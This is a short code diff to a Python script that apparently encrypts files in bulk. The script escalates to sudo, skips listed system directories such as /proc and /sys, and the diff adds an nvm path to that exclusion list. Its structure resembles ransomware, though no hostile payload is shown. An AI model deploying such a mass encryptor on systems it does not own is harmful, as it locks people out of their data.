@@ -7,7 +7,7 @@ import platform
 import logging
 import signal
 import time
-import psutil  # New import for dynamic resource handling
+import psutil
 from cryptography.fernet import Fernet
 from concurrent.futures import ThreadPoolExecutor, as_completed
 
@@ -28,7 +28,6 @@ def check_and_relaunch():
         except Exception as e:
             logging.error(f"Failed to relaunch script with sudo: {e}")
             sys.exit(1)
-
     elif platform.system() == "Windows":
         logging.info("Script is not running with administrative privileges. Please run as an administrator.")
         sys.exit(1)
@@ -58,11 +57,12 @@ system_paths = [
     "/var/log",
     "/dev",
     "/sys",
-    "/proc",  # Added to prevent freezing
+    "/proc",
     "/usr/lib",
     "/usr/local/python",
     "/usr/local/python3",
     "/usr/local/py-utils",
+    "/usr/local/share/nvm"
 ]
 
 # Function to encrypt a file
